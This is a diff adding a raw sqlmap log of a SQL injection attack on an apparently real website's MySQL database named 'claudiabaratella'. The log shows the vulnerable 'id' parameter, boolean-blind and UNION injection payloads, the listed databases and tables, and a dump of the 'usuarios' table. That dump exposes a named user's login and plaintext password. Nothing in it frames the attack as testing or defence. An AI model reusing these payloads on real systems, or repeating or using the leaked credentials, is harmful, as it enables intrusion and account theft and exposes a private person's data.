@@ -1,0 +1,68 @@
+sqlmap identified the following injection point(s) with a total of 82 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2 AND 9464=9464
+    Vector: AND [INFERENCE]
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: id=-9635 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71627a7171,0x6b784c71414a4f486c715964555371634c4852564a43575751795a457068555371756e4a4c485865,0x716a787171),NULL-- cBpr
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+available databases [2]:
+[*] claudiabaratella
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2 AND 9464=9464
+    Vector: AND [INFERENCE]
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: id=-9635 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71627a7171,0x6b784c71414a4f486c715964555371634c4852564a43575751795a457068555371756e4a4c485865,0x716a787171),NULL-- cBpr
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL 5
+Database: claudiabaratella
+[5 tables]
++-------------+
+| cursos      |
+| depoimentos |
+| grupos      |
+| paginas     |
+| usuarios    |
++-------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2 AND 9464=9464
+    Vector: AND [INFERENCE]
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: id=-9635 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71627a7171,0x6b784c71414a4f486c715964555371634c4852564a43575751795a457068555371756e4a4c485865,0x716a787171),NULL-- cBpr
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL 5
+Database: claudiabaratella
+Table: usuarios
+[1 entry]
++----+---------+-------+-----------+---------+-------+--------+---------------+
+| id | nome    | nivel | senha     | login   | ativo | sessao | data_cadastro |
++----+---------+-------+-----------+---------+-------+--------+---------------+
+| 1  | Claudia | 1     | clau13579 | claudia | 1     | NULL   | 2013-08-13    |
++----+---------+-------+-----------+---------+-------+--------+---------------+
+
